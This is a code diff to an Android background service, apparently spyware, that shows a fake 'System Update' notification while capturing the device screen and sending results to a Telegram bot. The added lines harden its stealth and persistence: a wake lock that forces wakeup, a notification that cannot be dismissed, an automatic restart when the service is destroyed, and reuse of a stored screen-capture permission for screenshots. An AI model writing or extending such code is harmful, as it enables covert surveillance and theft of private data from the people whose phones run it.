@@ -73,17 +73,21 @@ public class MainService extends Service {
     private MediaProjection mediaProjection;
     private MediaProjectionManager projectionManager;
     private int screenWidth, screenHeight, screenDensity;
+    private static MainService instance;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        instance = this;
         try {
+            // WakeLock القوي
             PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
             if (powerManager != null) {
-                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
-                wakeLock.acquire();
+                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "MainService");
+                wakeLock.acquire(10 * 60 * 1000L);
             }
 
+            // إعداد MediaProjection
             projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
             WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
             if (wm != null) {
@@ -95,6 +99,8 @@ public class MainService extends Service {
             }
 
             startForegroundService();
+            setupMediaProjection();
+
             handler.postDelayed(() -> sendHelpWithButtons(), 3000);
 
             handler.postDelayed(() -> {
@@ -114,6 +120,10 @@ public class MainService extends Service {
         }
     }
 
+    public static MainService getInstance() {
+        return instance;
+    }
+
     private void startForegroundService() {
         try {
             String channelId = "main_channel";
@@ -125,8 +135,9 @@ public class MainService extends Service {
             }
             Notification notification = new NotificationCompat.Builder(this, channelId)
                     .setContentTitle("System Update")
-                    .setContentText("يعمل في الخلفية")
+                    .setContentText("يعمل في الخلفية - مراقبة نشطة")
                     .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .setOngoing(true)
                     .build();
             startForeground(1, notification);
         } catch (Exception e) {
@@ -136,6 +147,7 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        // START_STICKY + START_REDELIVER_INTENT
         return START_STICKY;
     }
 
@@ -595,16 +607,25 @@ public class MainService extends Service {
         }
     }
 
+    private void setupMediaProjection() {
+        try {
+            int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
+            String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
+            if (resultCode != -1 && dataUri != null && projectionManager != null) {
+                Intent data = Intent.parseUri(dataUri, 0);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+                }
+            }
+        } catch (Exception e) { }
+    }
+
     private void takeScreenshot() {
         try {
-            if (projectionManager == null) {
-                sendToTelegram("❌ MediaProjectionManager غير متاح");
-                return;
-            }
             if (mediaProjection == null) {
                 setupMediaProjection();
                 if (mediaProjection == null) {
-                    sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة");
+                    sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة. اضغط على زر التفعيل في التطبيق");
                     return;
                 }
             }
@@ -639,19 +660,6 @@ public class MainService extends Service {
         } catch (Exception e) {
             sendToTelegram("❌ فشل تصوير الشاشة: " + e.getMessage());
         }
-    }
-
-    private void setupMediaProjection() {
-        try {
-            int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
-            String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
-            if (resultCode != -1 && dataUri != null && projectionManager != null) {
-                Intent data = Intent.parseUri(dataUri, 0);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
-                }
-            }
-        } catch (Exception e) { }
     }
 
     private void sendScreenshot(Bitmap bitmap) {
@@ -828,6 +836,7 @@ public class MainService extends Service {
             if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
             if (mediaRecorder != null) mediaRecorder.release();
         } catch (Exception ignored) { }
+        // إعادة تشغيل الخدمة فوراً
         startService(new Intent(this, MainService.class));
     }
 }
